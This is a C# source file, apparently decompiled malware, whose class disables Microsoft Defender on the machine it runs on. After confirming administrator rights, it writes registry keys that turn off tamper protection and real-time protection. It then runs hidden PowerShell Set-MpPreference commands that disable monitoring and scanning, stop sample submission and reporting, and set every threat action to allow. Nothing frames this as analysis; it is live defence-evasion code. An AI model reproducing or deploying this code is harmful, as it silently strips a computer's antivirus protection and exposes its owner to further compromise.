using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;

namespace MufMaOSvGyvz
{
	// Token: 0x0200000D RID: 13
	public static class ModifRegitry
	{
		// Token: 0x0600003A RID: 58
		public static void SetRegistryKey()
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				ModifRegitry.PushRegistryKey("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
				ModifRegitry.PushRegistryKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
				ModifRegitry.PushRegistryKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
				ModifRegitry.PushRegistryKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
				ModifRegitry.PushRegistryKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
				ModifRegitry.GetMSEPrefUser();
			}
		}

		// Token: 0x0600003B RID: 59
		private static void PushRegistryKey(string string_0, string string_1, string string_2)
		{
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree))
				{
					if (registryKey == null)
					{
						Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
					}
					else if (registryKey.GetValue(string_1) != string_2)
					{
						registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600003C RID: 60
		private static void GetMSEPrefUser()
		{
			Process process = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = "powershell",
					Arguments = "Get-MpPreference -verbose",
					UseShellExecute = false,
					RedirectStandardOutput = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				}
			};
			process.Start();
			while (!process.StandardOutput.EndOfStream)
			{
				string text = process.StandardOutput.ReadLine();
				if (text.StartsWith("DisableRealtimeMonitoring") && text.EndsWith("False"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -DisableRealtimeMonitoring $true");
				}
				else if (text.StartsWith("DisableBehaviorMonitoring") && text.EndsWith("False"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -DisableBehaviorMonitoring $true");
				}
				else if (text.StartsWith("DisableBlockAtFirstSeen") && text.EndsWith("False"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -DisableBlockAtFirstSeen $true");
				}
				else if (text.StartsWith("DisableIOAVProtection") && text.EndsWith("False"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -DisableIOAVProtection $true");
				}
				else if (text.StartsWith("DisablePrivacyMode") && text.EndsWith("False"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -DisablePrivacyMode $true");
				}
				else if (text.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") && text.EndsWith("False"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
				}
				else if (text.StartsWith("DisableArchiveScanning") && text.EndsWith("False"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -DisableArchiveScanning $true");
				}
				else if (text.StartsWith("DisableIntrusionPreventionSystem") && text.EndsWith("False"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -DisableIntrusionPreventionSystem $true");
				}
				else if (text.StartsWith("DisableScriptScanning") && text.EndsWith("False"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -DisableScriptScanning $true");
				}
				else if (text.StartsWith("SubmitSamplesConsent") && !text.EndsWith("2"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -SubmitSamplesConsent 2");
				}
				else if (text.StartsWith("MAPSReporting") && !text.EndsWith("0"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -MAPSReporting 0");
				}
				else if (text.StartsWith("HighThreatDefaultAction") && !text.EndsWith("6"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -HighThreatDefaultAction 6 -Force");
				}
				else if (text.StartsWith("ModerateThreatDefaultAction") && !text.EndsWith("6"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -ModerateThreatDefaultAction 6");
				}
				else if (text.StartsWith("LowThreatDefaultAction") && !text.EndsWith("6"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -LowThreatDefaultAction 6");
				}
				else if (text.StartsWith("SevereThreatDefaultAction") && !text.EndsWith("6"))
				{
					ModifRegitry.Loadpowershell("Set-MpPreference -SevereThreatDefaultAction 6");
				}
			}
		}

		// Token: 0x0600003D RID: 61
		public static void Loadpowershell(string string_0)
		{
			Process process = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = "powershell",
					Arguments = string_0,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				}
			};
			process.Start();
		}
	}
}
